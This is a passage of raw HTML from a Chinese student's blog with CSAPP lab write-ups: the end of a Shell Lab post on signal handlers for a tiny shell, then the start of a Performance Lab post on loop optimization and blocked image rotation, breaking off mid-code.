</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sigchld_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> olderrno = errno;   <span class="comment">//由于errno是全局变量,注意保存和恢复errno</span></span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line">    <span class="type">sigset_t</span> mask, prev;</span><br><span class="line">    sigfillset(&amp;mask);</span><br><span class="line">    <span class="keyword">while</span> ((pid = waitpid(<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>)&#123;      <span class="comment">//立即返回该子进程的pid</span></span><br><span class="line">        sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);   <span class="comment">//阻塞所有信号</span></span><br><span class="line">        <span class="keyword">if</span> (WIFEXITED(status))&#123;                 <span class="comment">//正常终止</span></span><br><span class="line">            deletejob(jobs, pid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (WIFSIGNALED(status))&#123;          <span class="comment">//因为信号而终止, 打印</span></span><br><span class="line">            <span class="built_in">printf</span> (<span class="string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, pid2jid(pid), pid, WTERMSIG(status));</span><br><span class="line">            deletejob(jobs, pid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (WIFSTOPPED(status))&#123;           <span class="comment">//因为信号而停止, 打印</span></span><br><span class="line">            <span class="built_in">printf</span> (<span class="string">&quot;Job [%d] (%d) stoped by signal %d\n&quot;</span>, pid2jid(pid), pid, WSTOPSIG(status));</span><br><span class="line">            job = getjobpid(jobs, pid);</span><br><span class="line">            job-&gt;state = ST;</span><br><span class="line">        &#125;</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);          </span><br><span class="line">    &#125;</span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里用到了并发编程原则 1，后面就是利用<code>waitpid</code>函数（前面讲解很清楚了），检测子进程的退出状态来实现相应操作，如回收子进程，打印相关信息等等。</p>
<h2 id="sigint-handler"><a href="#sigint-handler" class="headerlink" title="sigint_handler"></a>sigint_handler</h2><p>实现一个 SIGINT 信号处理函数，将信号传送给前台进程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span></span><br><span class="line"><span class="comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span></span><br><span class="line"><span class="comment"> *    to the foreground job.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sigint_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> olderrno = errno;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    <span class="type">sigset_t</span> mask_all, prev;</span><br><span class="line">    Sigfillset(&amp;mask_all);</span><br><span class="line">    Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev);   <span class="comment">//jobs为全局变量</span></span><br><span class="line">    <span class="keyword">if</span>((pid = fgpid(jobs)) != <span class="number">0</span>)&#123;</span><br><span class="line">        Sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">        Kill(-pid, SIGINT);</span><br><span class="line">    &#125;</span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为什么要在调用<code>fpgid</code>函数之前阻塞信号，我在<code>waitfg</code>实现中已经讲解了，这里不再赘述。</p>
<h2 id="sigstp-handler"><a href="#sigstp-handler" class="headerlink" title="sigstp_handler"></a>sigstp_handler</h2><p>实现一个 SIGSTOP 信号处理函数，将信号传送给前台进程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span></span><br><span class="line"><span class="comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span></span><br><span class="line"><span class="comment"> *     foreground job by sending it a SIGTSTP.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sigtstp_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> olderrno = errno;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    <span class="type">sigset_t</span> mask_all, prev;</span><br><span class="line">    Sigfillset(&amp;mask_all);</span><br><span class="line">    Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev);</span><br><span class="line">    <span class="keyword">if</span>((pid = fgpid(jobs)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        Sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">        Kill(-pid, SIGSTOP);</span><br><span class="line">    &#125;</span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码与上个函数几乎完全相同</p>
<h1 id="tsh-测试"><a href="#tsh-测试" class="headerlink" title="tsh 测试"></a>tsh 测试</h1><p>实验文件还包括了作者制作的参考 tsh，以及 16 个测试用例，通过跑用例查看结果与参考 tsh 是否相同，就能判断我们写的 tsh 有无问题，我这里仅放出其中几个用例的测试截图（左边为参考 tsh，右边为我的 tsh）：</p>
<p>trace 14：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220403172229310.png" alt="image-20220403172229310"></p>
<p>trace 15：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220403172401604.png" alt="image-20220403172401604"></p>
<p>trace 09：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220403172459125.png" alt="image-20220403172459125"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li>本实验还是相当有趣的，我们每天都在用 Shell，而它的一个最基础的作业控制就要考虑如此多的东西：回收进程，避免竞争等，着实令我大开眼界</li>
<li>读 CSAPP 第 8 章时，我对很多地方都不甚理解。而做完了本实验，通过亲自编写多线程的代码，考虑如何避免竞争，不断调试由于并发带来的 BUG，我对书上的例程一下子就领悟了，感谢 CMU 提供的实验材料！</li>
<li>这是我计算机生涯中第一次真正接触并发，所以很多地方只会照猫画虎，希望以后我的水平能不断提高，甚至能写出像 zsh 这样强大的终端工具</li>
<li>本实验耗时 2 天，约 9 小时</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://deconx.top/2022/03/26/CSAPP-Lab06/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/panda.jpg">
      <meta itemprop="name" content="西门吹水">
      <meta itemprop="description" content="天行健，君子以自强不息">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="潜龙勿用">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/26/CSAPP-Lab06/" class="post-title-link" itemprop="url">CSAPP-Lab06 Architecture Lab 记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-03-26 18:28:24" itemprop="dateCreated datePublished" datetime="2022-03-26T18:28:24+08:00">2022-03-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-06-10 23:56:34" itemprop="dateModified" datetime="2022-06-10T23:56:34+08:00">2022-06-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CSAPP-Lab/" itemprop="url" rel="index"><span itemprop="name">CSAPP Lab</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>12k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>11 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在 CMU，这个实验已经被 Cache Lab 取代了，含金量不高，相比其他实验也粗糙了很多，我不是很建议做。这周，我本打算开干 Shell Lab，奈何对 CSAPP 的第7、8章理解不甚透彻，于是先做做 Performance Lab 缓冲一下。</p>
<h1 id="实验概览"><a href="#实验概览" class="headerlink" title="实验概览"></a>实验概览</h1><p>要求编写两个图片处理的函数：将图片逆时针旋转90°、利用平均值替换的方式使图片平滑。最后根据函数运行的 CPE 得到分数。测试数据以及计算方式举例如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220326101355982.png" alt="image-20220326101355982"></p>
<p>实验的设计者用朴素方法实现了两个函数，运行情况及分数为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&gt; ./driver</span><br><span class="line">Teamname: Oh!</span><br><span class="line">Member <span class="number">1</span>: Deconx</span><br><span class="line">Email <span class="number">1</span>: deconx@vip.qq.com</span><br><span class="line"></span><br><span class="line">Rotate: Version = naive_rotate: Naive baseline implementation:</span><br><span class="line">Dim             <span class="number">64</span>      <span class="number">128</span>     <span class="number">256</span>     <span class="number">512</span>     <span class="number">1024</span>    Mean</span><br><span class="line">Your CPEs       <span class="number">1.4</span>     <span class="number">2.0</span>     <span class="number">3.8</span>     <span class="number">7.1</span>     <span class="number">6.3</span></span><br><span class="line">Baseline CPEs   <span class="number">14.7</span>    <span class="number">40.1</span>    <span class="number">46.4</span>    <span class="number">65.9</span>    <span class="number">94.5</span></span><br><span class="line">Speedup         <span class="number">10.8</span>    <span class="number">19.9</span>    <span class="number">12.2</span>    <span class="number">9.3</span>     <span class="number">15.1</span>    <span class="number">13.0</span></span><br><span class="line"></span><br><span class="line">Rotate: Version = rotate: Current working version:</span><br><span class="line">Dim             <span class="number">64</span>      <span class="number">128</span>     <span class="number">256</span>     <span class="number">512</span>     <span class="number">1024</span>    Mean</span><br><span class="line">Your CPEs       <span class="number">1.4</span>     <span class="number">2.0</span>     <span class="number">3.9</span>     <span class="number">7.4</span>     <span class="number">6.5</span></span><br><span class="line">Baseline CPEs   <span class="number">14.7</span>    <span class="number">40.1</span>    <span class="number">46.4</span>    <span class="number">65.9</span>    <span class="number">94.5</span></span><br><span class="line">Speedup         <span class="number">10.6</span>    <span class="number">20.0</span>    <span class="number">12.0</span>    <span class="number">8.9</span>     <span class="number">14.5</span>    <span class="number">12.7</span></span><br><span class="line"></span><br><span class="line">Smooth: Version = smooth: Current working version:</span><br><span class="line">Dim             <span class="number">32</span>      <span class="number">64</span>      <span class="number">128</span>     <span class="number">256</span>     <span class="number">512</span>     Mean</span><br><span class="line">Your CPEs       <span class="number">40.4</span>    <span class="number">41.9</span>    <span class="number">41.2</span>    <span class="number">41.8</span>    <span class="number">41.8</span></span><br><span class="line">Baseline CPEs   <span class="number">695.0</span>   <span class="number">698.0</span>   <span class="number">702.0</span>   <span class="number">717.0</span>   <span class="number">722.0</span></span><br><span class="line">Speedup         <span class="number">17.2</span>    <span class="number">16.6</span>    <span class="number">17.0</span>    <span class="number">17.2</span>    <span class="number">17.3</span>    <span class="number">17.1</span></span><br><span class="line"></span><br><span class="line">Smooth: Version = naive_smooth: Naive baseline implementation:</span><br><span class="line">Dim             <span class="number">32</span>      <span class="number">64</span>      <span class="number">128</span>     <span class="number">256</span>     <span class="number">512</span>     Mean</span><br><span class="line">Your CPEs       <span class="number">39.4</span>    <span class="number">41.2</span>    <span class="number">41.4</span>    <span class="number">42.2</span>    <span class="number">42.7</span></span><br><span class="line">Baseline CPEs   <span class="number">695.0</span>   <span class="number">698.0</span>   <span class="number">702.0</span>   <span class="number">717.0</span>   <span class="number">722.0</span></span><br><span class="line">Speedup         <span class="number">17.6</span>    <span class="number">17.0</span>    <span class="number">17.0</span>    <span class="number">17.0</span>    <span class="number">16.9</span>    <span class="number">17.1</span></span><br><span class="line"></span><br><span class="line">Summary of Your Best Scores:</span><br><span class="line">  Rotate: <span class="number">13.0</span> (naive_rotate: Naive baseline implementation)</span><br><span class="line">  Smooth: <span class="number">17.1</span> (naive_smooth: Naive baseline implementation)</span><br></pre></td></tr></table></figure>

<h1 id="回顾：程序性能优化方法"><a href="#回顾：程序性能优化方法" class="headerlink" title="回顾：程序性能优化方法"></a>回顾：程序性能优化方法</h1><p>做实验的目的在于学习与巩固，趁着这个机会，我将第 5 章的内容总结一下</p>
<h2 id="1-消除循环低效率"><a href="#1-消除循环低效率" class="headerlink" title="1. 消除循环低效率"></a>1. 消除循环低效率</h2><p>考虑如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> a[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; length(a); i++)&#123;</span><br><span class="line">        sum += a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过程<code>sum</code>调用<code>length</code>函数作为<code>for</code>循环的测试条件，每次循环迭代时都都会调用这个函数，而数组<code>a</code>的长度并不会随着循环的进行而改变，这样就会拖累程序性能，可以改为以下形式：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> a[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> len = length(a);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">        sum += a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种优化办法称为<strong>代码移动</strong></p>
<h2 id="2-消除内存引用"><a href="#2-消除内存引用" class="headerlink" title="2. 消除内存引用"></a>2. 消除内存引用</h2><p>考虑如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mult</span><span class="params">(<span class="type">int</span> a[], <span class="type">int</span> *dst)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> len = length(a);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">		*dst = *dst*a[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数的功能是将数组<code>a</code>的全部元素都乘到指针<code>dst</code>指向的内存中。每次迭代时，累积变量的值都会从<code>dst</code>指向的内存中读出，进行运算后再写入，这样的内存读写非常浪费，考虑如下优化：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mult</span><span class="params">(<span class="type">int</span> a[], <span class="type">int</span> *dst)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> len = length(a);</span><br><span class="line">    <span class="type">int</span> temp = *dst;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">		temp = temp*a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    *dst = temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先将<code>dst</code>指向的内存加载到寄存器中，所有操作结束后才写回到内存中，这样就能避免大量的内存读写。</p>
<h2 id="3-循环展开"><a href="#3-循环展开" class="headerlink" title="3. 循环展开"></a>3. 循环展开</h2><p>循环展开在 Architecture Lab 中进行了深入的探讨：</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/480380496">https://zhuanlan.zhihu.com/p/480380496</a></p>
<p>循环展开通过增加每次迭代计算的元素的数量，减少循环的迭代次数来提升效率，主要有以下两方面原因：</p>
<ul>
<li>减少了索引计算的次数</li>
<li>减少了条件分支的判断次数</li>
</ul>
<h1 id="rotate"><a href="#rotate" class="headerlink" title="rotate"></a>rotate</h1><p>矩阵旋转可以转化为以下两步简单的矩阵操作：</p>
<ul>
<li>转置</li>
<li>将第 $i$ 行与第 $N-1-i$ 行交换</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220326145343499.png" alt="image-20220326145343499"></p>
<p>实验设计者编写的原始代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">naive_rotate</span><span class="params">(<span class="type">int</span> dim, pixel *src, pixel *dst)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dim; i++)</span><br><span class="line">	<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; dim; j++)</span><br><span class="line">	    dst[RIDX(dim<span class="number">-1</span>-j, i, dim)] = src[RIDX(i, j, dim)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显，这里可以进行矩阵分块，分块处理我们已经在 Cache Lab 中进行了深入的研究，这里就不再重复分析了。</p>
<h2 id="32-×-32-分块"><a href="#32-×-32-分块" class="headerlink" title="32 × 32 分块"></a>32 × 32 分块</h2><p>测试数据的矩阵维数均为 32 的倍数，所以先考虑 32 × 32 分块</p>
<p>32×32 分块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">rotate</span><span class="params">(<span class="type">int</span> dim, pixel *src, pixel *dst)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; dim; i += <span class="number">32</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; dim; j += <span class="number">32</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = i; k &lt; i+<span class="number">32</span>; k++)&#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> s = j; s &lt; j+<span class="number">32</span>; s++)&#123;</span><br><span class="line">                    dst[RIDX(dim<span class="number">-1</span>-s, k, dim)] = src[RIDX(k, s, dim)];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Rotate: Version = naive_rotate: Naive baseline implementation:</span><br><span class="line">Dim             <span class="number">64</span>      <span class="number">128</span>     <span class="number">256</span>     <span class="number">512</span>     <span class="number">1024</span>    Mean</span><br><span class="line">Your CPEs       <span class="number">1.4</span>     <span class="number">2.1</span>     <span class="number">3.6</span>     <span class="number">7.8</span>     <span class="number">6.9</span></span><br><span class="line">Baseline CPEs   <span class="number">14.7</span>    <span class="number">40.1</span>    <span class="number">46.4</span>    <span class="number">65.9</span>    <span class="number">94.5</span></span><br><span class="line">Speedup         <span class="number">10.2</span>    <span class="number">18.7</span>    <span class="number">12.7</span>    <span class="number">8.4</span>     <span class="number">13.8</span>    <span class="number">12.3</span></span><br><span class="line"></span><br><span class="line">Rotate: Version = rotate: Current working version:</span><br><span class="line">Dim             <span class="number">64</span>      <span class="number">128</span>     <span class="number">256</span>     <span class="number">512</span>     <span class="number">1024</span>    Mean</span><br><span class="line">Your CPEs       <span class="number">1.9</span>     <span class="number">2.1</span>     <span class="number">2.3</span>     <span class="number">2.9</span>     <span class="number">6.9</span></span><br><span class="line">Baseline CPEs   <span class="number">14.7</span>    <span class="number">40.1</span>    <span class="number">46.4</span>    <span class="number">65.9</span>    <span class="number">94.5</span></span><br><span class="line">Speedup         <span class="number">7.9</span>     <span class="number">19.5</span>    <span class="number">19.8</span>    <span class="number">22.6</span>    <span class="number">13.8</span>    <span class="number">15.7</span></span><br></pre></td></tr></table></figure>

<p>效果不太理想，考虑消除最内层循环：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">rotate</span><span class="params">(<span class="type">int</span> dim, pixel *src, pixel *dst)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; dim; i += <span class="number">32</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; dim; j += <span class="number">32</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = i; k &lt; i+<span class="number">32</span>; k++)&#123;</span><br><span class="line">                dst[RIDX(dim<span class="number">-1</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">0</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-2</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">1</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-3</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">2</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-4</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">3</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-5</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">4</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-6</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">5</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-7</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">6</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-8</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">7</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-9</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">8</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-10</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">9</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-11</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">10</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-12</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">11</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-13</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">12</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-14</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">13</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-15</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">14</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-16</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">15</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-17</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">16</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-18</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">17</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-19</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">18</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-20</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">19</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-21</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">20</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-22</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">21</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-23</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">22</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-24</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">23</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-25</span>-j, k, dim)] = src[RIDX(k, j+<span 